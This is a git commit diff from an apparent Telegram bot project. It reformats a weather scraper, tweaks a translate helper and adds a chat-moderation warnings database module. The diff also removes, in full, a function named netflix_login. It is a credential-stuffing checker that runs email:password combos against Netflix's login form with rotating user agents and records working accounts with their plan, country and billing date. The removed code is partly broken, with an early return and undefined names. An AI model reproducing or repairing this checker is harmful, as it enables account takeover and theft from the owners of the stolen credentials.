7b171733cf896ca1c23cf45f5eb6254f957b73fa
Amarnathcjd <amarnathcharichilil@gmail.com>
2022-07-28 13:18:29 +0530

    oki

--- modules/_functions.py
+++ modules/_functions.py
@@ -40,7 +40,8 @@ def get_weather(city: str):
     data = weather.find_all("p")
     stat = data[0].text
     info = str(data[1]).split("<br/>")
-    details = [x.text for x in soup.find(class_="bk-focus__info").find_all("td")]
+    details = [x.text for x in soup.find(
+        class_="bk-focus__info").find_all("td")]
     result = (
         "<b>Weather in <code>{}</code></b>\n\n".format(city)
         + "<b>Temperature:</b> <code>{}</code>\n".format(
@@ -65,9 +66,6 @@ def get_weather(city: str):
 
 
 def translate(text, to_lang="en"):
-    # https://translate.google.com/translate_a/single?dj=1&q=bye&sl=en&tl=ja&hl=en-US&ie=UTF-8&oe=UTF-8&client=at&dt=t&dt=ld&dt=qca&dt=rm&dt=bd&dt=md&dt=ss&dt=ex&dt=sos&otf=2
-    # change API to above one
-    # add exampld, synonym etc
     url = "https://www.google.com/async/translate?vet=12ahUKEwiM3pvpx8z1AhV_SmwGHRb5C5MQqDh6BAgDECY..i&ei=EL_vYYyWFP-UseMPlvKvmAk&client=opera&yv=3"
     data = f"async=translate,sl:auto,tl:{to_lang},st:{quote(text)},id:1643102010421,qc:true,ac:true,_id:tw-async-translate,_pms:s,_fmt:pc"
     headers = {
@@ -77,103 +75,5 @@ def translate(text, to_lang="en"):
     request = post(url, data=data, headers=headers)
     soup = BeautifulSoup(request.text, "html.parser")
     result = soup.find("span", {"id": "tw-answ-target-text"})
-    return result.text if result else "vision.google.api returned err."
+    return result.text.capitalize() if result else "vision.google.api returned err."
 
-
-def netflix_login(combos):
-    hits = 0
-    bad = 0
-    result = []
-    for combo in combos:
-        client = Session()
-        login = client.get(
-            "https://www.netflix.com/login", headers={"User-Agent": ua().random}
-        )
-        soup = BeautifulSoup(login.text, "html.parser")
-        loginForm = soup.find("form")
-        authURL = loginForm.find("input", {"name": "authURL"}).get("value")
-        headers = {
-            "user-agent": ua().random,
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            "accept-language": "en-US,en;q=0.9",
-            "accept-encoding": "gzip, deflate, br",
-            "referer": "https://www.netflix.com/login",
-            "content-type": "application/x-www-form-urlencoded",
-            "cookie": "",
-        }
-        data = {
-            "userLoginId:": combo.split(":")[0],
-            "password": combo.split(":")[1],
-            "rememberMeCheckbox": "true",
-            "flow": "websiteSignUp",
-            "mode": "login",
-            "action": "loginAction",
-            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
-            "authURL": authURL,
-            "nextPage": "https://www.netflix.com/browse",
-            "countryCode": "+1",
-            "countryIsoCode": "US",
-        }
-
-        request = client.post(
-            "https://www.netflix.com/login",
-            headers=headers,
-            data=data,
-        )
-        cookie = dict(
-            flwssn=client.get(
-                "https://www.netflix.com/login", headers={"User-Agent": ua().random}
-            ).cookies.get("flwssn")
-        )
-
-        if (
-            "Sorry, we can't find an account with this email address. Please try again or"
-            in request.text
-        ):
-            bad += 1
-            print("No email.")
-        elif "Incorrect password" in request.text:
-            bad += 1
-            print("Incorrect pass.")
-
-        else:
-            print(requests.text)
-            return
-            info = client.get(
-                "https://www.netflix.com/YourAccount",
-                headers={
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "Accept-Encoding": "gzip, deflate, br",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Connection": "keep-alive",
-                    "Host": "www.netflix.com",
-                    "Referer": "https://www.netflix.com/browse",
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "same-origin",
-                    "Sec-Fetch-User": "?1",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
-                },
-                cookies=cookie,
-                timeout=10,
-            ).text
-
-            plan = (
-                info.split('data-uia="plan-label"><b>')[1].split("</b>")[0]
-                if len(info.split('data-uia="plan-label"><b>')) > 1
-                else "null"
-            )
-            country = info.split('","currentCountry":"')[1].split('"')[0]
-            expiry = info.split('data-uia="nextBillingDate-item">')[1].split("<")[0]
-            hits += 1
-            results.append(
-                {
-                    "email": combo.split(":")[0],
-                    "password": combo.split(":")[1],
-                    "plan": plan,
-                    "country": country,
-                    "expiry": expiry,
-                }
-            )
-    return result, hits, bad
---
+++ modules/db/warns_db.py
@@ -0,0 +1,137 @@
+from .db import DB
+from datetime import datetime
+
+warns = DB.warns
+warn_settings = DB.warn_settings
+
+CHAT_WARN_SETTINGS = {}
+DEFAULT_WARN_SETTINGS = {"max_warnings": 3,
+                         "warn_mode": "kick", "warn_time": 1, "action_time": 0}
+
+
+def warn_user(user_id, chat_id, reason, warn_by):
+    """
+    Warns a user in a chat.
+    """
+    warns.update_one({"user_id": user_id, "chat_id": chat_id},
+                     {"$addToSet": {"warnings": {"reason": reason,
+                                                 "warned_by": warn_by, "date": datetime.now()}}},
+                     {"$inc": {"warn_count": 1}}, upsert=True)
+
+
+def remove_last_warn(user_id, chat_id):
+    """
+    Removes the last warning from a user in a chat.
+    """
+    if get_warn_count(user_id, chat_id) == 0:
+        return False
+    warns.update_one({"user_id": user_id, "chat_id": chat_id},
+                     {"$pop": {"warnings": -1}})
+    return True
+
+
+def remove_all_warns(user_id, chat_id):
+    """
+    Removes all warnings from a user in a chat.
+    """
+    if get_warn_count(user_id, chat_id) == 0:
+        return False
+    warns.delete_one({"user_id": user_id, "chat_id": chat_id})
+    return True
+
+
+def reset_chat_warnings(chat_id):
+    """
+    Resets the warning settings for a chat.
+    """
+    warns.delete_many({"chat_id": chat_id})
+
+
+def get_warn_count(user_id, chat_id):
+    """
+    Returns the number of warnings a user has in a chat.
+    """
+    warn = warns.find_one({"user_id": user_id, "chat_id": chat_id})
+    if warn is None:
+        return 0
+    return warn["warn_count"]
+
+
+def get_warnings(user_id, chat_id):
+    """
+    Returns a list of warnings a user has in a chat.
+    """
+    warn = warns.find_one({"user_id": user_id, "chat_id": chat_id})
+    if warn is None:
+        return []
+    return warn["warnings"]
+
+
+def get_warn_setting(chat_id):
+    """
+    Returns the warning settings for a chat.
+    """
+    warn_setting = warn_settings.find_one({"chat_id": chat_id})
+    if warn_setting is None:
+        return DEFAULT_WARN_SETTINGS
+    for key in ["max_warnings", "warn_mode", "warn_time", "action_time"]:
+        if key not in warn_setting or warn_setting[key] is None:
+            warn_setting[key] = DEFAULT_WARN_SETTINGS[key]
+    return warn_setting
+
+
+def set_warn_setting(chat_id, max_warnings, warn_mode, warn_time, action_time):
+    """
+    Sets the warning settings for a chat.
+    """
+    warn_settings.update_one({"chat_id": chat_id},
+                             {"$set": {"max_warnings": max_warnings,
+                                       "warn_mode": warn_mode,
+                                       "warn_time": warn_time,
+                                       "action_time": action_time}},
+                             upsert=True)
+    CHAT_WARN_SETTINGS[chat_id] = {"max_warnings": max_warnings,
+                                   "warn_mode": warn_mode,
+                                   "warn_time": warn_time,
+                                   "action_time": action_time}
+    return True
+
+
+def reset_warn_settings(chat_id):
+    """
+    Resets the warning settings for a chat.
+    """
+    warn_settings.delete_one({"chat_id": chat_id})
+    if chat_id in CHAT_WARN_SETTINGS:
+        del CHAT_WARN_SETTINGS[chat_id]
+    return True
+
+
+def get_chat_warn_settings(chat_id):
+    """
+    Returns the warning settings for a chat.
+    """
+    if chat_id in CHAT_WARN_SETTINGS:
+        return CHAT_WARN_SETTINGS[chat_id]
+    warn_setting = get_warn_setting(chat_id)
+    CHAT_WARN_SETTINGS[chat_id] = warn_setting
+    return warn_setting
+
+def get_all_warn_settings():
+    """
+    Returns all warning settings.
+    """
+    settings = warn_settings.find()
+    if settings is None:
+        return []
+    return list(settings)
+
+def cache_warn_settings():
+    """
+    Caches all warning settings.
+    """
+    settings = get_all_warn_settings()
+    for setting in settings:
+        CHAT_WARN_SETTINGS[setting["chat_id"]] = setting
+    
+cache_warn_settings()
